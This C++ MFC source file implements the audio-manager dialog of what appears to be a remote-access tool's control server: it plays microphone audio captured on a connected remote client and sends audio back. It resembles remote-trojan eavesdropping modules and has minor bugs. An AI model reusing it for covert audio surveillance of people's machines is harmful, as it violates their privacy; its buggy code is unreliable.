// DlgAudioManager.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "DlgAudioManager.h"
#include "afxdialogex.h"


// CDlgAudioManager �Ի���

IMPLEMENT_DYNAMIC(CDlgAudioManager, CDialog)

CDlgAudioManager::CDlgAudioManager(CWnd* pParent, _CIOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_AUDIO_MANAGER, pParent)
	, m_CEdit_Dialog_Audio_Manager_Status(_T(""))
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CDlgAudioManager::~CDlgAudioManager()
{
}

void CDlgAudioManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_CESIT_DIALOG_AUDIO_STATUS, m_CEdit_Dialog_Audio_Manager_Status);
}


BEGIN_MESSAGE_MAP(CDlgAudioManager, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON_AUDIO_RECORD, &CDlgAudioManager::OnBnClickedButtonAudioRecord)
	ON_BN_CLICKED(IDC_BUTTON_AUDIO_SPEAK, &CDlgAudioManager::OnBnClickedButtonAudioSpeak)
END_MESSAGE_MAP()


// CDlgAudioManager ��Ϣ�������


void CDlgAudioManager::WindowHandleIO()
{
	if (m_ContextObject == NULL)
	{
		return;
	}

	switch (m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0)[0])
	{
	case CLIENT_AUDIO_MANAGER_RECORD_DATA:
	{
		m_AudioObject.PlayBuffer(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1),
		m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1);
		break;
	}
	default:
		//���䷢���쳣����
		break;
	}
}

BOOL CDlgAudioManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_IconHwnd, FALSE);
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //�õ����ӵ�ip 
	v1.Format("%s - ��Ƶ����", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//���öԻ������
	SetWindowText(v1);
	UpdateData(TRUE);
	m_CEdit_Dialog_Audio_Manager_Status = "����";
	UpdateData(FALSE);
	//�ش��ͻ���
	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}


void CDlgAudioManager::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}
	
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		m_ContextObject->DialogHandle = NULL;
		m_ContextObject->DialogID = 0;
	}
	CDialog::OnClose();
}


void CDlgAudioManager::OnBnClickedButtonAudioRecord()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	UpdateData(TRUE);
	if (m_CEdit_Dialog_Audio_Manager_Status == "����")
	{
		m_CEdit_Dialog_Audio_Manager_Status = "¼��";
		m_AudioObject.ChangeStatus();
		m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProcedure, this, 0, NULL);	//���������߳�
	}
	UpdateData(FALSE);


}

DWORD CDlgAudioManager::ThreadProcedure(LPVOID ParameterData)
{
	CDlgAudioManager* This = (CDlgAudioManager*)ParameterData;
	while (1)
	{
		This->SendRecordData();
	}
	return 0;
}

VOID CDlgAudioManager::SendRecordData()
{
	DWORD BufferLength = 0;
	DWORD SendLength = 0;
	//�����Ƶ����
	LPBYTE v1 = m_AudioObject.GetRecordData(&BufferLength);
	if (v1 == NULL)
	{
		return;
	}
	//���뻺����
	LPBYTE BufferData = new BYTE[BufferLength + 1];
	//��־
	BufferData[0] = CLIENT_AUDIO_MANAGER_RECORD_DATA;
	memcpy(BufferData + 1, v1, BufferLength);
	if (BufferLength > 0)
	{
		m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
	}
	if (BufferData != NULL)
	{
		delete BufferData;
		BufferData = NULL;
	}
	return;
}

void CDlgAudioManager::OnBnClickedButtonAudioSpeak()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	UpdateData(TRUE);
	if (m_CEdit_Dialog_Audio_Manager_Status == "¼��")
	{
		m_CEdit_Dialog_Audio_Manager_Status = "����";
		TerminateThread(m_WorkThreadHandle, -1);
		if (m_WorkThreadHandle != NULL)
		{
			CloseHandle(m_WorkThreadHandle);
			m_WorkThreadHandle = NULL;
		}
		m_AudioObject.ChangeStatus();
		BYTE Token = CLENT_AUDIO_MANAGER_PLAY;
		m_IOCPServer->OnPrepareSending(m_ContextObject, &Token, sizeof(BYTE));
	}
	UpdateData(FALSE);
}
